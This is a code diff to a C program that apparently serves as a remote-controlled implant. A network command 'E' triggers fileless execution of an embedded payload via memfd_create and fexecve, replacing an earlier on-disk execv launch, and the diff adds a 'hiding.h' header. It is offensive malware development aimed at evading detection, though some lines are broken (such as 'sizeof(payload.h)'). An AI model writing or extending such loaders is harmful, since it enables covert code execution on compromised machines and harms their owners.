@@ -8,11 +8,18 @@
 #include <unistd.h>
 #include <wait.h>
 #include <fcntl.h>
+#include <sys/memfd.h> 
+#include <sys/syscall.h>
 #include <unistd.h>
-#include "payload.h"
+#include "hiding.h"
 
 
 unsigned int payload_len = sizeof(payload.h);
+
+void sigchld_handler(int s)
+{
+    while(waitpid(-1, NULL, WNOHANG) > 0); 
+}
 
 int main(void){
 	 
@@ -46,6 +53,16 @@ int main(void){
 			bzero(buffer, sizeof(buffer));
 	addr_size = sizeof(client_addr);
 	
+	//--this is to register the handler function--//
+	struct sigaction sa;
+	sa.sa_handler = sigchld_handler;
+	sigemptyset(&sa.sa_mask);
+	sa.sa_flags = SA_RESTART;
+	if (sigaction(SIGCHLD, &sa, NULL) == -1) {
+		perror("sigaction");
+		exit(1);
+	}
+	
 		while(1) //this is ther server, everything happens in here 
 		{
 			recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
@@ -75,37 +92,48 @@ int main(void){
 				close(fd);
 			}else if(strcmp(buffer, "E") == 0)
 			{
-				printf("I got an E\n");
+				printf("I got an E (Execute command). Loading payload into memory...\n");
 				
-				pid_t p1 = 0;
-				pid_t parentID = getpid();
-				char pbuffer[16];
-				sprintf(pbuffer, "%d", parentID);
-				char *args[] = {"./payload",  pbuffer, NULL}; //parentID was pbuffer
-				int p1fork = fork();
-				if( 0 == p1fork)
-				{   
-					execv(args[0], args);
-				}else{
-				// do other fun things like execute other
-				// payloads or just nothing or respawning
-				// killed off payloads
-					wait(NULL); // wait for the child to complete
+				int fd = memfd_create("in_memory_payload", MFD_CLOEXEC);
+				if (fd == -1) {
+					perror("[-]memfd_create failed");
 				}
 
+				ssize_t bytes_written = write(fd, payload, payload_len);
+				if (bytes_written != payload_len) {
+					perror("[-]write to memfd failed (Incomplete write)");
+					close(fd);
+				} else {
+					printf("[+]Payload loaded into memory (%d bytes).\n", (int)bytes_written);
+				}
+				
+				pid_t p1fork = fork();
+				
+				if (p1fork == 0) {
+					pid_t parentID = getppid();
+					char pbuffer[16];
+					sprintf(pbuffer, "%d", parentID);
+					
+					char *args[] = {"/proc/self/fd/memfd_payload", pbuffer, NULL}; 
+					char *envp[] = {NULL}; 
+					
+					printf("[+]Child (PID %d) executing in-memory payload...\n", getpid());
+					
+					fexecve(fd, args, envp);
+					
+					perror("[-]fexecve failed"); 
+					exit(1); 
+					
+				} else if (p1fork > 0) {
+					printf("[+]Payload process started with PID: %d\n", p1fork);
+					close(fd);
+				} else {
+					perror("[-]fork error");
+				}
 			}
-			
-
-			
 		}
+		
 		bzero(buffer, 2);
-
-
-
-
-
-
-
 
 return 0;
 }
